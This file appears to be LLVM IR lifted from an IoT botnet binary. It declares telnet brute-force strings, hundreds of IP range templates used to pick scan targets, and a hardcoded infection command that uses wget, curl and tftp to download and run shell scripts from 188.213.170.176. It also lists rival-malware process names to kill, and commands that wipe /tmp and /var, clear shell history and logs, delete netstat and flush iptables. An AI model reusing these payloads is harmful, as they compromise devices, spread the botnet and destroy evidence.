source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%1 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }
%2 = type { i1, i1, i1, i1 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r10 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@cr0_so = internal unnamed_addr global i1 false
@cr4 = internal unnamed_addr global i4 0
@lr = internal unnamed_addr global i32 0
@global_var_10030000.1 = global i32 0
@global_var_1002a6a8.3 = global i32 0
@global_var_1002a6b4.4 = local_unnamed_addr global i32* @global_var_1002a6a8.3
@global_var_1002ac30.7 = global i32 0
@global_var_1002a6ac.8 = global i32 0
@global_var_1002ac48.9 = global i32 0
@global_var_1002ac4c.10 = local_unnamed_addr global i32 0
@global_var_1002ac50.11 = local_unnamed_addr global i32 0
@global_var_1002a748.12 = local_unnamed_addr global i32 4095
@global_var_1002a744.13 = local_unnamed_addr global i32 362436
@global_var_10015ee0.14 = constant [7 x i8] c"(null)\00"
@global_var_1002abc8.15 = local_unnamed_addr global i32 0
@global_var_100013c0.16 = constant i32 1208009481
@global_var_1000140c.17 = constant i32 939589631
@global_var_10001460.18 = constant i32 1207959608
@global_var_10015ee8.19 = constant [8 x i8] c"/bin/sh\00"
@global_var_10015ef0.20 = constant [3 x i8] c"sh\00"
@global_var_10015ef4.21 = constant [3 x i8] c"-c\00"
@global_var_100014c0.22 = constant [3 x i8] c"8`\00"
@global_var_100014f0.23 = constant i32 1207959576
@global_var_10015ef8.24 = constant i32 -1
@global_var_100162f8.25 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_10016308.26 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_10001ce8.27 = constant i32 939524096
@global_var_10001d34.28 = constant i32 939524097
@global_var_10001f28.29 = constant i32 939524126
@global_var_1002aba8.30 = local_unnamed_addr global i32 0
@global_var_10016314.31 = constant [5 x i8] c"PING\00"
@global_var_10002024.32 = constant i32 939524126
@global_var_1001631c.33 = constant [14 x i8] c"gethostbyname\00"
@global_var_10002248.34 = constant i32 939524097
@global_var_100022c4.35 = constant i32 939524096
@global_var_10002358.36 = constant i32 939524098
@global_var_10002560.37 = constant i32 939524097
@global_var_1002abb0.38 = global i32 0
@global_var_1002abb4.39 = local_unnamed_addr global i32 0
@global_var_1002abdc.40 = local_unnamed_addr global i32 0
@global_var_100028d8.41 = constant i32 939524096
@global_var_1001632c.42 = constant [6 x i8] c":>%$#\00"
@global_var_10016334.48 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_10016340.49 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_10016350.50 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_1001635c.51 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1001636c.52 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_10016378.53 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_10016388.54 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_10016394.55 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_100163a4.56 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_100163b4.57 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_100163c4.58 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_100163d4.59 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_100163e0.60 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_100163f0.61 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_10016400.62 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_10016410.63 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_10016420.64 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_10016430.65 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_10016440.66 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_10016450.67 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1001645c.68 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_10016468.69 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_10016478.70 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_10016484.71 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_10016490.72 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_1001649c.73 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_100164a8.74 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_100164b4.75 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_100164c4.76 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_100164d4.77 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_100164e0.78 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_100164f0.79 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_100164fc.80 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_10016508.81 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_10016514.82 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_10016520.83 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_1001652c.84 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_10016538.85 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_10016544.86 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_10016554.87 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_10016564.88 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_10016574.89 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_10016584.90 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_10016594.91 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_100165a4.92 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_100165b4.93 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_100165c4.94 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_100165d4.95 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_100165e4.96 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_100165f4.97 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_10016604.98 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_10016614.99 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_10016624.100 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_10016634.101 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_10016644.102 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_10016654.103 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_10016664.104 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_10016674.105 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_10016684.106 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_10016694.107 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_100166a4.108 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_100166b4.109 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_100166c4.110 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_100166d4.111 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_100166e4.112 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_100166f4.113 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_10016704.114 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_10016714.115 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_10016724.116 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_10016734.117 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_10016744.118 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_10016754.119 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_10016764.120 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_10016774.121 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_10016784.122 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_10016794.123 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_100167a4.124 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_100167b4.125 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_100167c4.126 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_100167d4.127 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_100167e4.128 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_100167f4.129 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_10016804.130 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_10016814.131 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_10016824.132 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_10016834.133 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_10016844.134 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_10016854.135 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_10016864.136 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_10016874.137 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_10016884.138 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_10016894.139 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_100168a4.140 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_100168b4.141 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_100168c4.142 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_100168d4.143 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_100168e4.144 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_100168f4.145 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_10016904.146 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_10016910.147 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_10016920.148 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_10016930.149 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_10016940.150 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_1001694c.151 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_1001695c.152 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_1001696c.153 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_1001697c.154 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1001698c.155 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_1001699c.156 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_100169ac.157 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_100169bc.158 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_100169cc.159 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_100169dc.160 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_100169ec.161 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_100169fc.162 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_10016a0c.163 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_10016a1c.164 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_10016a2c.165 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_10016a3c.166 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_10016a48.167 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_10016a58.168 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_10016a68.169 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_10016a78.170 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_10016a88.171 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_10016a98.172 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_10016aa8.173 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_10016ab8.174 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_10016ac8.175 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_10016ad8.176 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_10016ae8.177 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_10016af8.178 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_10016b08.179 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_10016b18.180 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_10016b28.181 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_10016b38.182 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_10016b48.183 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_10016b58.184 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_10016b68.185 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_10016b78.186 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_10016b88.187 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_10016b98.188 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_10016ba8.189 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_10016bb8.190 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_10016bc8.191 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_10016bd8.192 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_10016be8.193 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_10016bf8.194 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_10016c08.195 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_10016c18.196 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_10016c28.197 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_10016c38.198 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_10016c44.199 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_10016c54.200 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_10016c64.201 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_10016c74.202 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_10016c84.203 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_10016c94.204 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_10016ca4.205 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_10016cb4.206 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_10016cc4.207 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_10016cd4.208 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_10016ce4.209 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_10016cf4.210 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_10016d04.211 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_10016d14.212 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_10016d24.213 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_10016d34.214 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_10016d44.215 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_10016d54.216 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_10016d64.217 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_10016d74.218 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_10016d84.219 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_10016d94.220 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_10016da4.221 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_10016db4.222 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_10016dc4.223 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_10016dd4.224 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_10016de4.225 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_10016df4.226 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_10016e04.227 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_10016e14.228 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_10016e24.229 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_10016e34.230 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_10016e44.231 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_10016e54.232 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_10016e64.233 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_10016e74.234 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_10016e84.235 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_10016e94.236 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_10016ea4.237 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_10016eb4.238 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_10016ec4.239 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_10016ed4.240 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_10016ee4.241 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_10016ef4.242 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_10016f04.243 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_10016f14.244 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_10016f24.245 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_1002a74c.246 = global i32 110
@global_var_10016f34.247 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_1002abd0.248 = local_unnamed_addr global i32 0
@global_var_100079f4.249 = constant i32 939524096
@global_var_10015ed0.250 = constant [8 x i8] c"BusyBox\00"
@global_var_10015ed8.251 = constant i32 603979776
@global_var_10015edc.252 = constant i32 587202560
@global_var_1002a708.253 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10015ed0.250, i32 0, i32 0), i8* bitcast (i32* @global_var_10015ed8.251 to i8*), i8* bitcast (i32* @global_var_10015edc.252 to i8*)]
@global_var_10015e98.254 = constant [7 x i8] c"nvalid\00"
@global_var_10015ea0.255 = constant [6 x i8] c"ailed\00"
@global_var_10015ea8.256 = constant [9 x i8] c"ncorrect\00"
@global_var_10015eb4.257 = constant [6 x i8] c"enied\00"
@global_var_10015ebc.258 = constant [5 x i8] c"rror\00"
@global_var_10015ec4.259 = constant [7 x i8] c"oodbye\00"
@global_var_10015ecc.260 = constant [4 x i8] c"bad\00"
@global_var_1002a6e8.261 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10015e98.254, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10015ea0.255, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10015ea8.256, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10015eb4.257, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10015ebc.258, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10015ec4.259, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10015ecc.260, i32 0, i32 0)]
@global_var_10007e6c.262 = constant i32 939524098
@global_var_10007f28.263 = constant i32 939524096
@global_var_10016fc0.264 = constant i32 -61260
@global_var_10015d28.269 = constant [7 x i8] c"telnet\00"
@global_var_10015d30.270 = constant [5 x i8] c"root\00"
@global_var_10015d38.271 = constant i32 0
@global_var_10016fe0.280 = constant [327 x i8] c"%s cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A x00\00"
@global_var_10017128.281 = constant [3 x i8] c"AA\00"
@global_var_10017130.282 = constant [320 x i8] c"cd /tmp; wget http://188.213.170.176 /gtop.sh || curl -O http://188.213.170.176 /gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 188.213.170.176  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 188.213.170.176 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh;exit\0D\0A\00"
@global_var_10009198.283 = constant i32 1207959564
@global_var_100173f8.284 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_10017408.285 = constant [6 x i8] c"/tmp/\00"
@global_var_10017410.286 = constant [6 x i8] c"/var/\00"
@global_var_10017418.287 = constant [6 x i8] c"/dev/\00"
@global_var_10017420.288 = constant [10 x i8] c"/var/run/\00"
@global_var_1001742c.289 = constant [10 x i8] c"/dev/shm/\00"
@global_var_10017438.290 = constant [6 x i8] c"/mnt/\00"
@global_var_10017440.291 = constant [7 x i8] c"/boot/\00"
@global_var_10017448.292 = constant [6 x i8] c"/usr/\00"
@global_var_10017450.293 = constant [9 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_100173f8.284, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017408.285, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017410.286, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017418.287, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_10017420.288, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1001742c.289, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017438.290, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017440.291, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017448.292, i32 0, i32 0)]
@global_var_10017338.294 = constant [5 x i8] c"wget\00"
@global_var_10017340.295 = constant [6 x i8] c"armv*\00"
@global_var_100172d4.296 = constant [5 x i8] c"bot*\00"
@global_var_10017348.297 = constant [6 x i8] c"ntpd*\00"
@global_var_100172e8.298 = constant [7 x i8] c"hackz*\00"
@global_var_10017350.299 = constant [8 x i8] c"shitty*\00"
@global_var_10017358.300 = constant [6 x i8] c"jack*\00"
@global_var_100172ac.301 = constant [6 x i8] c"mips*\00"
@global_var_1001728c.302 = constant [5 x i8] c"sex*\00"
@global_var_10017360.303 = constant [4 x i8] c"i86\00"
@global_var_10017364.304 = constant [5 x i8] c"ssh*\00"
@global_var_100172cc.305 = constant [5 x i8] c"sh4*\00"
@global_var_100172dc.306 = constant [11 x i8] c"jackmeoff*\00"
@global_var_10017294.307 = constant [6 x i8] c"tftp*\00"
@global_var_1001736c.308 = constant [4 x i8] c"i56\00"
@global_var_10017370.309 = constant [5 x i8] c"mips\00"
@global_var_10017378.310 = constant [7 x i8] c"mipsel\00"
@global_var_10017380.311 = constant [4 x i8] c"sh4\00"
@global_var_10017384.312 = constant [4 x i8] c"x86\00"
@global_var_10017388.313 = constant [5 x i8] c"i686\00"
@global_var_10017390.314 = constant [4 x i8] c"ppc\00"
@global_var_10017394.315 = constant [5 x i8] c"i586\00"
@global_var_1001739c.316 = constant [23 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017338.294, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017340.295, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100172d4.296, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017348.297, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100172e8.298, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017350.299, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017358.300, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100172ac.301, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001728c.302, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017360.303, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017364.304, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100172cc.305, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100172dc.306, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017294.307, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1001736c.308, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017370.309, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_10017378.310, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017380.311, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017384.312, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017388.313, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10017390.314, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017394.315, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017394.315, i32 0, i32 0)]
@global_var_10017270.317 = constant [8 x i8] c"jackmy*\00"
@global_var_10017278.318 = constant [9 x i8] c"busybox*\00"
@global_var_10017284.319 = constant [5 x i8] c"bin*\00"
@global_var_1001729c.320 = constant [5 x i8] c"arm*\00"
@global_var_100172a4.321 = constant [8 x i8] c"mipsel*\00"
@global_var_100172b4.322 = constant [8 x i8] c"mips64*\00"
@global_var_100172bc.323 = constant [6 x i8] c"i686*\00"
@global_var_100172c4.324 = constant [7 x i8] c"sparc*\00"
@global_var_100172f0.325 = constant [6 x i8] c"bruv*\00"
@global_var_100172f8.326 = constant [16 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_10017270.317, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10017278.318, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017284.319, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001728c.302, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_10017294.307, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1001729c.320, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100172a4.321, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100172ac.301, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100172b4.322, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100172bc.323, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100172c4.324, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100172cc.305, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_100172d4.296, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_100172dc.306, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_100172e8.298, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_100172f0.325, i32 0, i32 0)]
@global_var_10009238.327 = constant i32 939524096
@global_var_10017478.328 = constant [100 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve ;echo ps aux >> proc ; pkill -9 %d\0D\0A\00"
@global_var_1000931c.329 = constant i32 1207959668
@global_var_100174fc.331 = constant [14 x i8] c"pkill -9 %s\0D\0A\00"
@global_var_100093dc.332 = constant i32 1207959564
@global_var_1001750c.333 = constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00"
@global_var_10017538.334 = constant [21 x i8] c"rm -rf /var/log/wtmp\00"
@global_var_10017550.335 = constant [22 x i8] c"history -c;history -w\00"
@global_var_10017568.336 = constant [14 x i8] c"rm -rf /tmp/*\00"
@global_var_10017578.337 = constant [11 x i8] c"history -c\00"
@global_var_10017584.338 = constant [23 x i8] c"rm -rf ~/.bash_history\00"
@global_var_1001759c.339 = constant [20 x i8] c"rm -rf /bin/netstat\00"
@global_var_100175b0.340 = constant [11 x i8] c"history -w\00"
@global_var_100175bc.341 = constant [17 x i8] c"pkill -9 busybox\00"
@global_var_100175d0.342 = constant [14 x i8] c"pkill -9 perl\00"
@global_var_100175e0.343 = constant [22 x i8] c"service iptables stop\00"
@global_var_100175f8.344 = constant [36 x i8] c"/sbin/iptables -F;/sbin/iptables -X\00"
@global_var_10017644.345 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
